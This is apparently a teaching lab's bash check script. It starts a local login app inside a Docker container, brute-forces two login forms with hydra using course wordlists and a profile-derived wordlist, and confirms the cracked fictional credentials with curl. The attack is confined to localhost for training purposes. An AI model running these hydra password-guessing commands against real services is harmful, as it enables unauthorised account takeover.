#!/bin/bash
set -euo pipefail
[[ -f /.dockerenv ]] || { echo 'Run inside the isolated Docker container.'; exit 1; }
lab_dir=$(cd -- "$(dirname -- "$0")" && pwd)
mkdir -p /tmp/lab12
run() { printf '\n$'; printf ' %q' "$@"; printf '\n'; "$@"; }
python3 -m uvicorn main:app --app-dir "$lab_dir" --host 127.0.0.1 --port 8000 >/tmp/lab12/server.txt 2>&1 &
server_pid=$!
trap 'kill "$server_pid" 2>/dev/null || true' EXIT
for attempt in {1..50}; do
    if curl -fsS http://127.0.0.1:8000/openapi.json >/dev/null 2>&1; then break; fi
    sleep 0.1
done
run curl -fsS -d 'username=admin&password=wrong' http://127.0.0.1:8000/login
[[ $(curl -fsS -d 'username=admin&password=wrong' http://127.0.0.1:8000/login) == '"Invalid credentials"' ]]
run hydra -f -I -V -t 1 -L "$lab_dir/course-usernames.txt" -P "$lab_dir/course-passwords.txt" -s 8000 127.0.0.1 http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'
run curl -fsS -d 'username=admin&password=12345admin' http://127.0.0.1:8000/login
[[ $(curl -fsS -d 'username=admin&password=12345admin' http://127.0.0.1:8000/login) == '"secret token"' ]]
run python3 "$lab_dir/profile_words.py"
run hydra -f -I -V -t 1 -L /tmp/lab12/profile-usernames.txt -P /tmp/lab12/profile-passwords.txt -s 8000 127.0.0.1 http-post-form '/profile-login:username=^USER^&password=^PASS^:F=Invalid'
run curl -fsS -d 'username=demo&password=Mira1999!' http://127.0.0.1:8000/profile-login
[[ $(curl -fsS -d 'username=demo&password=Mira1999!' http://127.0.0.1:8000/profile-login) == '"fictional profile token"' ]]
printf '\nCHECK: both fictional accounts verified with direct HTTP requests.\n'
